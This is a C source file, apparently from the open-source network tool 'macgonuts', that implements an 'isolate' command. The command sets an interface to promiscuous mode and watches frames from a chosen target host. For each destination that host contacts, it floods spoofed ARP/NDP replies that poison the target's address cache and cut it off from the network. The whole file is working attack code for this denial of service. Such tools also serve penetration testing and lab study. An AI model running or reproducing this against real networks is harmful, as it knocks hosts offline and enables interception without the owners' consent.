/*
 * Copyright (c) 2022, Rafael Santiago
 * All rights reserved.
 *
 * This source code is licensed under the BSD-style license found in the
 * LICENSE file in the root directory of this source tree.
 */
#include <cmd/macgonuts_isolate_task.h>
#include <cmd/hooks/macgonuts_isolate_init_hook.h>
#include <cmd/hooks/macgonuts_isolate_deinit_hook.h>
#include <cmd/hooks/macgonuts_isolate_done_hook.h>
#include <cmd/macgonuts_option.h>
#include <cmd/macgonuts_misc_utils.h>
#include <macgonuts_status_info.h>
#include <macgonuts_ethfrm.h>
#include <macgonuts_etherconv.h>
#include <macgonuts_ipconv.h>
#include <macgonuts_socket.h>
#include <macgonuts_socket_common.h>
#include <macgonuts_get_ethaddr.h>
#include <macgonuts_spoof.h>
#include <macgonuts_metaspoofer.h>

static struct macgonuts_spoofing_guidance_ctx g_Spfgd = { 0 };

static int g_URandomFd = -1;

static int fill_up_lo_info(void);

static int fill_up_tg_info(void);

static int do_isolate(void);

static int cut_off_route_to(const uint8_t *first_addr, const uint8_t *last_addr);

static void get_random_mac(uint8_t *hw_addr, const size_t hw_addr_size);

static int is_valid_no_route_to(const char **no_route_to, const size_t no_route_to_nr);

static void sigint_watchdog(int signo);

static int should_cut_off(const unsigned char *ethbuf, const size_t ethbuf_size);

static int get_dest_addr(uint8_t *src_addr, const unsigned char *ethbuf, const size_t ethbuf_size);

static int cut_off_route(void);

static int get_gateway_hw_addr(uint8_t *hw_addr, const size_t hw_addr_size);

int macgonuts_isolate_task(void) {
    int err = EFAULT;
    char **no_route_to = NULL;
    size_t no_route_to_nr = 0;
    const char *timeout = NULL;

    g_Spfgd.usrinfo.lo_iface = macgonuts_get_option("lo-iface", NULL);
    if (g_Spfgd.usrinfo.lo_iface == NULL) {
        macgonuts_si_error("--lo-iface option is missing.\n");
        return EXIT_FAILURE;
    }

    g_Spfgd.usrinfo.tg_address = macgonuts_get_option("isle-addr", NULL);
    if (g_Spfgd.usrinfo.tg_address == NULL) {
        macgonuts_si_error("--isle-addr option is missing.\n");
        return EXIT_FAILURE;
    }

    g_Spfgd.handles.wire = macgonuts_create_socket(g_Spfgd.usrinfo.lo_iface, 1);
    if (g_Spfgd.handles.wire == -1) {
        macgonuts_si_error("unable to create socket.\n");
        goto macgonuts_isolate_task_epilogue;
    }

    err = fill_up_lo_info();
    if (err != EXIT_SUCCESS) {
        macgonuts_si_error("unable to get local host's network information.\n");
        goto macgonuts_isolate_task_epilogue;
    }

    err = fill_up_tg_info();
    if (err != EXIT_SUCCESS) {
        macgonuts_si_error("unable to get isle host's network information.\n");
        goto macgonuts_isolate_task_epilogue;

    }

    g_Spfgd.hooks.init = macgonuts_isolate_init_hook;
    g_Spfgd.hooks.deinit = macgonuts_isolate_deinit_hook;
    g_Spfgd.hooks.done = macgonuts_isolate_done_hook;

    g_Spfgd.spoofing.total = 50;

    signal(SIGINT, sigint_watchdog);
    signal(SIGTERM, sigint_watchdog);

    err = do_isolate();

macgonuts_isolate_task_epilogue:

    if (no_route_to != NULL) {
        macgonuts_free_array_option_value(no_route_to, no_route_to_nr);
    }

    macgonuts_release_spoof_layers_ctx(&g_Spfgd.layers);

    return err;
}

int macgonuts_isolate_task_help(void) {
    macgonuts_si_print("use: macgonuts isolate --lo-iface=<label>\n"
                       "                       --isle-addr=<ip4|ip6>\n"
                       "                      [--keep-flooding --timeout=<mss>]\n");
    return EXIT_SUCCESS;
}

static int do_isolate(void) {
    int err = EXIT_SUCCESS;
    unsigned char ethbuf[64<<10];
    ssize_t ethbuf_size = 0;
    macgonuts_hook_func init = g_Spfgd.hooks.init;
    macgonuts_hook_func deinit = g_Spfgd.hooks.deinit;

    g_Spfgd.hooks.init = NULL;
    g_Spfgd.hooks.deinit = NULL;

    assert(init != NULL && deinit != NULL);

    err = macgonuts_set_iface_promisc_on(g_Spfgd.usrinfo.lo_iface);

    if (err != EXIT_SUCCESS) {
        macgonuts_si_error("unable to set `%s` to promisc mode.\n", g_Spfgd.usrinfo.lo_iface);
        return EXIT_FAILURE;
    }

    init(&g_Spfgd, NULL, 0);

    while (!g_Spfgd.spoofing.abort && err == EXIT_SUCCESS) {
        ethbuf_size = macgonuts_recvpkt(g_Spfgd.handles.wire, ethbuf, sizeof(ethbuf));
        if (ethbuf_size == -1) {
            continue;
        }
        if (should_cut_off(ethbuf, ethbuf_size)) {
            err = get_dest_addr(g_Spfgd.layers.spoof_proto_addr, ethbuf, ethbuf_size);
            if (err != EXIT_SUCCESS) {
                continue;
            }
            err = cut_off_route();
        }
    }

    deinit(&g_Spfgd, NULL, 0);

    if (g_URandomFd != -1) {
        close(g_URandomFd);
        g_URandomFd = -1;
    }

    macgonuts_set_iface_promisc_off(g_Spfgd.usrinfo.lo_iface);

    return err;
}

static int get_gateway_hw_addr(uint8_t *hw_addr, const size_t hw_addr_size) {
    uint8_t gw_addr[16] = { 0 };
    size_t gw_addr_size = 0;
    char gw_proto_addr[100] = "";
    char iface[256] = "";
    macgonuts_socket_t wire = -1;
    int err = EFAULT;

    if (macgonuts_get_gateway_addr_info(iface, sizeof(iface), gw_addr, &gw_addr_size) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    if (macgonuts_raw_ip2literal(gw_proto_addr,
                                 sizeof(gw_proto_addr) - 1,
                                 gw_addr, gw_addr_size) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }
    wire = macgonuts_create_socket(iface, 1);
    if (wire == -1) {
        return EXIT_FAILURE;
    }
    err = macgonuts_get_ethaddr(hw_addr, hw_addr_size,
                                gw_proto_addr, strlen(gw_proto_addr),
                                wire, iface);
    macgonuts_release_socket(wire);
    return err;
}

static int should_cut_off(const unsigned char *ethbuf, const size_t ethbuf_size) {
    uint16_t ether_type = 0;

    if (ethbuf_size < 14) {
        return 0;
    }

    ether_type = (uint16_t)ethbuf[12] << 8 |
                 (uint16_t)ethbuf[13];

    switch (g_Spfgd.layers.proto_addr_version) {
        case 4:
            if (ether_type != MACGONUTS_ETHER_TYPE_IP4) {
                return 0;
            }
            break;

        case 6:
            if (ether_type != MACGONUTS_ETHER_TYPE_IP6) {
                return 0;
            }
            break;

        default:
            return 0;
            break;
    }

    return (memcmp(&ethbuf[6],
                   &g_Spfgd.layers.tg_hw_addr[0],
                   sizeof(g_Spfgd.layers.tg_hw_addr)) == 0);
}

static int get_dest_addr(uint8_t *src_addr, const unsigned char *ethbuf, const size_t ethbuf_size) {
    uint16_t ether_type = 0;
    const unsigned char *src_addr_p = NULL;
    size_t src_addr_size = 0;

    if (ethbuf_size < 14) {
        return EINVAL;
    }

    ether_type = (uint16_t)ethbuf[12] << 8 |
                 (uint16_t)ethbuf[13];

    switch (ether_type) {
        case MACGONUTS_ETHER_TYPE_IP4:
            src_addr_p = &ethbuf[14 + 16];
            src_addr_size = 4;
            break;

        case MACGONUTS_ETHER_TYPE_IP6:
            src_addr_p = &ethbuf[14 + 24];
            src_addr_size = 16;
            break;

        default:
            return EINVAL;
    }

    memcpy(src_addr, src_addr_p, src_addr_size);

    return EXIT_SUCCESS;
}

static int cut_off_route(void) {
    char spoof_addr[100] = "";
    char spoof_mac[32] = "";
    int err = EXIT_SUCCESS;
    uint64_t t;

    macgonuts_raw_ip2literal(spoof_addr, sizeof(spoof_addr),
                             g_Spfgd.layers.spoof_proto_addr,
                             g_Spfgd.layers.proto_addr_size);
    g_Spfgd.usrinfo.spoof_address = &spoof_addr[0];


    for (t = 0; t < g_Spfgd.spoofing.total && !g_Spfgd.spoofing.abort && err == EXIT_SUCCESS; t++) {
        err = macgonuts_spoof(g_Spfgd.handles.wire, &g_Spfgd.layers);
    }

    if (g_Spfgd.spoofing.abort) {
        return err;
    }

    if (err == EXIT_SUCCESS) {
        err = g_Spfgd.hooks.done(&g_Spfgd, NULL, 0);
    } else {
        snprintf(spoof_mac, sizeof(spoof_mac) - 1,
                 "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x", g_Spfgd.layers.lo_hw_addr[0],
                                                  g_Spfgd.layers.lo_hw_addr[1],
                                                  g_Spfgd.layers.lo_hw_addr[2],
                                                  g_Spfgd.layers.lo_hw_addr[3],
                                                  g_Spfgd.layers.lo_hw_addr[4],
                                                  g_Spfgd.layers.lo_hw_addr[5]);
        macgonuts_si_error("unable to spoof `%s` as `%s` on `%s`.\n", spoof_addr,
                                                                      spoof_mac,
                                                                      g_Spfgd.usrinfo.tg_address);
    }

    return err;
}

/*
static int is_valid_no_route_to(const char **no_route_to, const size_t no_route_to_nr) {
    const char **rp = no_route_to;
    const char **rp_end = rp + no_route_to_nr;
    size_t rp_size;

    while (rp != rp_end) {
        rp_size = strlen(*rp);
        if (macgonuts_check_ip_addr(*rp, rp_size)
            && macgonuts_get_ip_version(*rp, rp_size) != g_Spfgd.layers.proto_addr_size) {
            macgonuts_si_error("ip version mismatch : `%s`.\n", *rp);
            return 0;
        } else if (macgonuts_check_ip_cidr(*rp, rp_size)
                   && macgonuts_get_cidr_version(*rp, rp_size) != g_Spfgd.layers.proto_addr_size) {
            macgonuts_si_error("cidr version mismatch : `%s`.\n", *rp);
            return 0;
        }
        rp++;
    }

    return 1;
}
*/

static void sigint_watchdog(int signo) {
    g_Spfgd.spoofing.abort = 1;
}

static int fill_up_lo_info(void) {
    return get_gateway_hw_addr(&g_Spfgd.layers.lo_hw_addr[0], sizeof(g_Spfgd.layers.lo_hw_addr));
}

static int fill_up_tg_info(void) {
    char addr_buf[256] = "";
    size_t tg_address_size = strlen(g_Spfgd.usrinfo.tg_address);
    g_Spfgd.layers.proto_addr_version = macgonuts_get_ip_version(g_Spfgd.usrinfo.tg_address, tg_address_size);
    if (g_Spfgd.layers.proto_addr_version != 4
        && g_Spfgd.layers.proto_addr_version != 6) {
        macgonuts_si_error("you gave me an ip address from outter space, I only support ip version 4 or 6.\n");
        return EXIT_FAILURE;
    }

    g_Spfgd.layers.proto_addr_size = (g_Spfgd.layers.proto_addr_version == 4) ? 4 : 16;

    if (macgonuts_get_addr_from_iface(addr_buf, sizeof(addr_buf) - 1,
                                      g_Spfgd.layers.proto_addr_version,
                                      g_Spfgd.usrinfo.lo_iface) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    if (macgonuts_get_raw_ip_addr(g_Spfgd.layers.lo_proto_addr,
                                  g_Spfgd.layers.proto_addr_size,
                                  addr_buf, strlen(addr_buf)) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    if (macgonuts_get_raw_ip_addr(g_Spfgd.layers.tg_proto_addr,
                                  g_Spfgd.layers.proto_addr_size,
                                  g_Spfgd.usrinfo.tg_address, tg_address_size) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    if (macgonuts_get_ethaddr(&g_Spfgd.layers.tg_hw_addr[0],
                              sizeof(g_Spfgd.layers.tg_hw_addr),
                              g_Spfgd.usrinfo.tg_address, tg_address_size,
                              g_Spfgd.handles.wire, g_Spfgd.usrinfo.lo_iface) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
